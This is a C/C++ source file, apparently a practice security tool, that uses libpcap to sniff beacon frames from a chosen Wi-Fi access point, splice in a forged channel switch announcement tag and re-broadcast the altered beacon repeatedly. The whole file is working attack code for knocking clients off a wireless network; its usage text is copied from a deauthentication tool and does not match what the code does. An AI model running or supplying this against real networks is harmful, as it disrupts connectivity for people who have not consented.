#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include "mac.h"
#include "radiotap.h"
#include "wireless.h"

// todo: 비콘 프레임 캡처, 5바이트의 채널 스위치 알림 삽입하여 전송하도록.

ST_MAC macFromArgv(char* argv)
{
    ST_MAC mac;
    uint32_t temp[6];
    int count = sscanf(argv, "%x:%x:%x:%x:%x:%x",
            &temp[0], &temp[1], &temp[2],
            &temp[3], &temp[4], &temp[5]);
    if (count == 6)
    {
        for (int i=0; i<6; i++)
        {
            mac.mac[i] = (uint8_t)temp[i];
        }
    }
    return mac;
}

void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3 || 4 < argc) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

int main(int argc, char* argv[])
{
    if(!parse(&param, argc, argv)) return -1;

    ST_MAC ap_mac = macFromArgv(argv[2]);
    ST_MAC st_mac = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    int sendCount = 1;
    while(true)
    {
        // phase 1: beacon frame capture
        pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
        {
            printf("Timeout... (No packets)\n"); continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        const ST_RDT rdt = capRdt(packet);
        const ST_WL wl = capWl(packet+rdt.len);
        if (memcmp(ap_mac.mac, wl.bssid.mac, 6) != 0) continue;
        //printf("target mac detected\n");
        if (!chkBeacon(&wl)) continue;
        //printf("beacon frame captured\n");
        int presentCount = isPresentCount(packet);
        uint32_t caplen = header->caplen;
        bool Fcs = hasFcs(packet, &rdt, presentCount);

        // phase 2: insert channel switch announcement
        const u_char* beaconTagPacket = (packet + rdt.len + sizeof(ST_WL) + sizeof(ST_BC_COMMON));
        int tagLen = (header->caplen - rdt.len - sizeof(ST_WL) - sizeof(ST_BC_COMMON));
        int InsertTagLoc =  header->caplen - tagLen +
            getInsertTagLoc(beaconTagPacket, tagLen, 37);

        int newPacketLen = header->caplen + 5;
        u_char* newPacket = new u_char[newPacketLen];
        memcpy(newPacket, packet, InsertTagLoc);
        uint8_t csaTag[5] = {0x25, 0x03, 0x01, 0x0B, 0x03};
        memcpy(newPacket+InsertTagLoc, csaTag, 5);
        memcpy(newPacket+InsertTagLoc+5, packet+InsertTagLoc, header->caplen-InsertTagLoc);
        // header->caplen을 패킷에서 찾는건줄 알았으나, 와이어샤크에서 pcap 파일을 수정 후 열때 문제인 것 같아 pass

        // phase 3: send beacon attack frame
        res = pcap_sendpacket(pcap, newPacket, newPacketLen);
        if(res != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }

        printf("target: ");
        printf("%02X:%02X:%02X:%02X:%02X:%02X",
                ap_mac.mac[0], ap_mac.mac[1], ap_mac.mac[2],
                ap_mac.mac[3], ap_mac.mac[4], ap_mac.mac[5]);
        printf("     send packet [%d]\n", sendCount);
        sendCount ++;
        if (sendCount == 1000) sendCount = 999;
        delete[] newPacket;
        usleep(100000);
    }

    pcap_close(pcap);

    return 0;
}